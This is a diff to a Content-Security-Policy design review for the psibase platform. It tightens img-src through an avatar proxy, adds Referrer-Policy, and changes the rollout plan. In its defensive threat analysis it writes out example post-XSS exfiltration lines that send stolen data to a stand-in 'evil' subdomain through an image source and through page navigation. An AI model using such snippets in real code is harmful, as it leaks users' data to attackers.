@@ -18,8 +18,9 @@ the platform architecture verified in the codebase (last verified against
 1. **Host injection.** `sites` can inject, per request, the request's own
    origin (covered by `'self'`) and the deployment **root domain** `{root}`,
    derived by stripping the leading service label from the request `Host`
-   header. All subdomains are `<service>.{root}`. This is the main engineering
-   item this review depends on, but the primitives already exist:
+   header. All subdomains are `<service>.{root}`. This is one of the two
+   engineering prerequisites this review depends on (see *Prerequisites and
+   order of operations*), but the primitives already exist:
    `Sites::serveSys` already calls `to<HttpServer>().rootHost(request.host)` at
    the point the CSP is assembled, and `HttpServer::getSiblingUrl` already
    demonstrates deriving the scheme (`forwardedProto` → `isSecure(socket)` →
@@ -34,23 +35,101 @@ the platform architecture verified in the codebase (last verified against
 3. **Strictness target.** Where a choice exists, we pick the strictest value
    that does not break a verified use, and rely on the existing `setCsp` action
    for app developers to opt into anything looser.
-4. **Rollout.** Ship first as `Content-Security-Policy-Report-Only` with a
-   reporting endpoint, then enforce. Tightening the default retroactively
-   affects any already-deployed third-party app that never called `setCsp`, so
-   this is a breaking change and needs a migration/communication plan.
+
+---
+
+## Prerequisites and order of operations
+
+Two separate bodies of engineering work gate this rollout. They are
+independent of each other, but both must land before the final policies in
+this document can be enforced as written.
+
+### Prerequisite A — dynamic host injection (already documented)
+
+The per-request `{root}` injection described under Assumptions. The
+primitives exist (`HttpServer::rootHost`, and the scheme/port derivation in
+`HttpServer::getSiblingUrl`); the current branch hard-codes
+`psibase.localhost:8080` in `Sites.cpp` as a placeholder until this lands.
+This prerequisite unblocks shipping *any* of the policies below with real
+hosts.
+
+### Prerequisite B — avatar proxying
+
+Today avatars are uploaded to each account's own subdomain (`sites` path
+`<account>.{root}/profile/avatar`, via the `Profiles` plugin) and fetched
+**cross-subdomain** by the shared `Avatar` component (Homepage
+contacts/Chainmail/tokens, etc.). That is the only verified first-party use
+forcing `*.{root}` into `img-src`, and it carries two costs that no CSP value
+can fix while the feature works this way:
+
+1. **Activity oracle.** Every avatar render pings the pictured account's
+   subdomain. A malicious app that registers its own HTTP handler can
+   persist request logs server-side (the `subjective` database is writable
+   during RPC), so merely *viewing* a Chainmail message or contact entry for
+   account `evil` tells `evil` you did so, and when. Any policy that permits
+   the avatar feature permits this tracking.
+2. **Exfiltration channel.** Any `*.{root}` image source — even path-scoped,
+   since CSP matching ignores query strings — lets a post-XSS payload
+   exfiltrate silently via
+   `new Image().src = "https://evil.{root}/…?stolen=…"`, landing the data in
+   the same subjective-DB logging described above.
+
+The work: serve all avatars from a single first-party host — e.g.
+`profiles.{root}/avatar/<account>`, with the `profiles` service reading the
+stored avatar content — and point the shared `Avatar` component at it. Then
+`img-src` shrinks to one prefix-matched source and both problems disappear
+(the proxy host learns which avatars are fetched, but `profiles` is a
+first-party system service, not an arbitrary account).
+
+### Order of operations
+
+1. **Prerequisite A** (dynamic `{root}` injection) — required first; nothing
+   here ships with real hosts without it.
+2. **Prerequisite B** (avatar proxy) — required before the tightened
+   `img-src` below can be enforced.
+3. **Land together:** the avatar proxy, the tightened `img-src`, and the
+   per-app first-party `connect-src` allowlists (see Watch list). Sequencing
+   these separately buys nothing: tightening `connect-src` while the image
+   channel is open adds maintenance cost for a fence with a hole in it, and
+   tightening `img-src` before the proxy exists breaks avatars.
+
+If the CSP rollout must ship before Prerequisite B, use
+`img-src 'self' data: {root} *.{root}` as an **interim** value everywhere
+this document says `img-src 'self' data: profiles.{root}/avatar/ branding.{root}`,
+and treat the tightened value as the target state.
+
+### Rollout: enforce directly, skip Report-Only
+
+Nothing is in production yet, so the usual
+`Content-Security-Policy-Report-Only` phase (protecting live users from
+silent breakage) is unnecessary — enforce directly. Two mitigations replace
+it:
+
+- CSP violations do not throw; they fail silently (an image doesn't render, a
+  fetch returns an error) and are only *loudly* reported in the devtools
+  console. After enforcement lands, do one deliberate smoke pass with
+  devtools open over the code paths most likely to break — which are exactly
+  the exception list below: supervisor Wasm/`blob:` loading, prompt pages
+  framed by the supervisor, Explorer's inline bootstrap, Docs
+  MathJax/Mermaid, and the invite-acceptance flow.
+- If telemetry is wanted later, an *enforced* policy can carry a `report-to`
+  directive; adopting it does not require going back to a dual-header
+  Report-Only rollout.
 
 ---
 
 ## Recommended default CSP
 
 Applies to the **majority** of Sites (any normal first-party or third-party web
-app that renders UI and talks to the platform).
+app that renders UI and talks to the platform). Assumes Prerequisite B (avatar
+proxying) has landed; see *Prerequisites and order of operations* for the
+interim `img-src` value if it has not.
 
 ```
 default-src 'self';
 script-src 'self';
 style-src 'self' 'unsafe-inline';
-img-src 'self' data: {root} *.{root};
+img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
 connect-src 'self' {root} *.{root};
 frame-src supervisor.{root};
@@ -63,7 +142,7 @@ object-src 'none';
 As a single header value:
 
 ```
-default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: {root} *.{root}; font-src 'self'; connect-src 'self' {root} *.{root}; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
+default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: profiles.{root}/avatar/ branding.{root}; font-src 'self'; connect-src 'self' {root} *.{root}; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
 ```
 
 > **Notation.** Host sources are written **scheme-relative** (no `http://` /
@@ -81,14 +160,29 @@ default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src
 | `default-src` | `'self'` | Backstop for any directive not listed. |
 | `script-src` | `'self'` | Verified for all Vite-built apps: no inline `<script>`, no `eval`/`new Function`/Wasm compilation, no `blob:`/CDN script loading. Dangerous script capabilities live in the supervisor only. The two non-Vite sites (Explorer/SvelteKit and Docs/mdbook) *do* emit inline scripts and are listed as exceptions. |
 | `style-src` | `'self' 'unsafe-inline'` | Unavoidable: the shadcn chart component injects a runtime `<style>` via `dangerouslySetInnerHTML`. Style injection cannot execute JS, so risk is low. Removing it requires per-response style nonces, which conflicts with static hosting + ETag caching. |
-| `img-src` | `'self' data: {root} *.{root}` | `data:` for generated identicons (dicebear `toDataUri`) and base64 app icons (Workshop). `{root} *.{root}` because user avatars are uploaded to each account's own subdomain (`sites` path `/profile/avatar`, see `Profiles` plugin) and loaded **cross-subdomain** by the shared `Avatar` component (Homepage contacts/tokens, etc.). Arbitrary off-domain images still require per-app opt-in. |
+| `img-src` | `'self' data: profiles.{root}/avatar/ branding.{root}` | `data:` for generated identicons (dicebear `toDataUri`) and base64 app icons (Workshop). `profiles.{root}/avatar/` (trailing slash = prefix match; CSP ignores query strings, so cache-bust params are fine) is the single avatar proxy host from Prerequisite B, replacing the former `{root} *.{root}` wildcard. `branding.{root}` because Config previews the network logo from `branding.{root}/network_logo.svg` — a fixed first-party host. The apex `{root}` is dropped: it only 302-redirects to the homepage subdomain (`HttpServer.cpp`), so nothing loads images from it. Arbitrary off-domain images still require per-app opt-in. |
 | `font-src` | `'self'` | Fonts are self-hosted; no CDN font usage found. |
-| `connect-src` | `'self' {root} *.{root}` | Apps `fetch` GraphQL/RPC directly from sibling subdomains (e.g. `transact`, `branding`, `invite`, `dyn-ld`). `'self'` also covers same-origin WebSockets. Supervisor comms is `postMessage`, which CSP does not govern. The apex `{root}` is listed explicitly because `*.{root}` does not match the bare root domain. |
+| `connect-src` | `'self' {root} *.{root}` | Apps `fetch` GraphQL/RPC directly from sibling subdomains (e.g. `transact`, `branding`, `invite`, `dyn-ld`). `'self'` also covers same-origin WebSockets. Supervisor comms is `postMessage`, which CSP does not govern. The apex `{root}` is listed explicitly because `*.{root}` does not match the bare root domain. The wildcard stays in the **default** because third-party apps' sibling-RPC needs cannot be enumerated — cross-subdomain RPC is the platform's fabric. First-party apps should tighten this per app once Prerequisite B lands; see the Watch list (*Per-app `connect-src` allowlists*). |
 | `frame-src` | `supervisor.{root}` | The only iframe a normal app mounts is the hidden supervisor iframe injected by `@psibase/common-lib`. |
 | `frame-ancestors` | `'self'` | Normal app pages are not meant to be embedded cross-origin (clickjacking defense). Apps that expose a prompt page override this — see exceptions. |
 | `base-uri` | `'none'` | Nothing sets `<base>`; blocks `<base>`-injection that would redirect relative resource loads. |
 | `form-action` | `'self'` | Apps submit via `fetch`, not native cross-origin form posts. |
 | `object-src` | `'none'` | No `<object>`/`<embed>` usage. |
+
+### Companion header: `Referrer-Policy: same-origin`
+
+Serve `Referrer-Policy: same-origin` platform-wide alongside the CSP (it is a
+separate response header, not a CSP directive). Every psibase subdomain is a
+distinct origin, so under the browser default
+(`strict-origin-when-cross-origin`) any request from an app to another
+subdomain — an avatar fetch, a clicked link — still announces the requesting
+app's origin to the destination. `same-origin` keeps the full referrer URL
+for same-origin requests (useful for first-party debugging) but sends
+**nothing** cross-origin: no `Referer` header, empty `document.referrer`.
+Combined with Prerequisite B this removes the "this user is currently in
+app X" signal from anything an untrusted subdomain can observe. A page that
+legitimately needs to send a cross-origin referrer can override per element
+with the `referrerpolicy` attribute.
 
 ### Sites covered by the default
 
@@ -142,7 +236,7 @@ Recommended (site-wide) policy:
 default-src 'self';
 script-src 'self' 'wasm-unsafe-eval' blob:;
 style-src 'self' 'unsafe-inline';
-img-src 'self' data: {root} *.{root};
+img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
 connect-src 'self' blob: {root} *.{root};
 frame-src {root} *.{root};
@@ -182,7 +276,7 @@ Recommended (site-wide) policy = default, with `frame-ancestors` widened:
 default-src 'self';
 script-src 'self';
 style-src 'self' 'unsafe-inline';
-img-src 'self' data: {root} *.{root};
+img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
 connect-src 'self' {root} *.{root};
 frame-src supervisor.{root};
@@ -209,7 +303,7 @@ override must be a complete policy:
 default-src 'self';
 script-src 'self';
 style-src 'self' 'unsafe-inline';
-img-src 'self' data: {root} *.{root};
+img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
 connect-src 'self' {root} *.{root};
 frame-src supervisor.{root};
@@ -241,7 +335,7 @@ Recommended (site-wide) policy = default, with a build-time script hash:
 default-src 'self';
 script-src 'self' 'sha256-{explorer-inline-script-hash}';
 style-src 'self' 'unsafe-inline';
-img-src 'self' data: {root} *.{root};
+img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
 connect-src 'self' {root} *.{root};
 frame-src supervisor.{root};
@@ -350,11 +444,31 @@ object-src 'none';
 
 ## Watch list / follow-ups
 
-- **`img-src` for external images.** The known first-party case (cross-subdomain
-  avatars at `<account>.{root}/profile/avatar`) is now covered by
-  `{root} *.{root}` in the default. Truly external images (arbitrary
+- **`img-src` for external images.** The known first-party case (avatars) is
+  covered by the `profiles.{root}/avatar/` proxy source once Prerequisite B
+  lands (interim: `{root} *.{root}`). Truly external images (arbitrary
   user-supplied URLs, off-domain token icons/NFT art) remain blocked by default
   and need per-app opt-in via `setCsp`; re-audit if such a feature ships.
+- **Per-app `connect-src` allowlists (first-party apps).** Once Prerequisite B
+  closes the image exfiltration channel, `connect-src *.{root}` becomes the
+  dominant remaining path for silent post-XSS exfiltration to a hostile
+  subdomain, and tightening it per app starts paying for its upkeep. The
+  default keeps the wildcard (third-party apps' needs can't be enumerated),
+  but first-party apps should ship `setCsp` overrides listing only the hosts
+  they fetch directly — most first-party sibling traffic already flows through
+  the supervisor iframe (under the *supervisor's* CSP), so the per-app list is
+  short (e.g. for Homepage: `'self'` plus `invite.{root}` and the token/
+  namemarket GraphQL hosts). Do **not** hand-maintain these lists: generate
+  them at packaging time from a per-app declaration (as already planned for
+  Explorer's script hash), so a stale list fails loudly in dev rather than
+  rotting silently. Land together with Prerequisite B (see *Order of
+  operations*).
+- **Residual exfiltration via navigation.** Even with `img-src` and
+  `connect-src` tight, CSP cannot block top-level navigation
+  (`window.location = "https://evil.{root}/?stolen=…"`), so a determined XSS
+  retains a noisy, one-shot exfiltration route. The realistic win from the
+  tightening above is eliminating the *silent, repeatable* channels; calibrate
+  expectations accordingly.
 - **Explorer hash automation.** Exception 4 depends on computing the SvelteKit
   inline-script hash at build/packaging time and injecting it into Explorer's
   `setCsp`. Until that automation exists, Explorer needs the `'unsafe-inline'`
@@ -371,7 +485,8 @@ object-src 'none';
   the first pass.
 - **Apex vs. subdomain.** `*.{root}` does not match the bare `{root}`; keep the
   explicit apex `{root}` entry alongside the `*.{root}` wildcard in
-  `connect-src`/`frame-src` wherever apps may hit the root domain.
+  `connect-src`/`frame-src` wherever apps may hit the root domain. (`img-src`
+  no longer needs the apex — it only redirects to the homepage subdomain.)
 - **Dev / localhost.** Local origins are `http://` with ports (e.g.
   `http://config.psibase.localhost:8080`). `'self'` already covers the app's own
   origin — including scheme, host, and port — so same-origin scripts (the
@@ -397,8 +512,10 @@ object-src 'none';
   `isLocalhost` check (already used for the cookie `Secure` flag in
   `CommonApi.cpp`). `require-trusted-types-for 'script'` is aspirational — it
   needs app-side Trusted Types adoption first.
-- **Backward compatibility.** Roll out via `Content-Security-Policy-Report-Only`
-  with a reporting endpoint before enforcing.
+- **Rollout.** Enforce directly; skip the `Content-Security-Policy-Report-Only`
+  phase (nothing is in production). See *Rollout: enforce directly, skip
+  Report-Only* under Prerequisites for the post-enforcement smoke pass and the
+  option of adding `report-to` to the enforced policy later.
 
 ---
 
@@ -413,3 +530,9 @@ object-src 'none';
 | Explorer | `explorer` | Exception 4 | site-wide | SvelteKit inline bootstrap script (per-build hash) |
 | Docs | `docs` | Exception 5 | site-wide | mdbook inline scripts + MathJax (cdnjs) and Mermaid (jsdelivr) CDNs |
 | XAdmin, XProxy | `x-admin`, `x-proxy` | Admin policy | via `x-sites` | Admin panels; `x-sites` has no default-CSP mechanism (gap) |
+
+All policies above assume Prerequisites A (dynamic host injection) and B
+(avatar proxying) have landed — see *Prerequisites and order of operations*.
+First-party apps in the **Default** row are additionally candidates for
+generated per-app `connect-src` allowlists (Watch list), which land together
+with Prerequisite B.
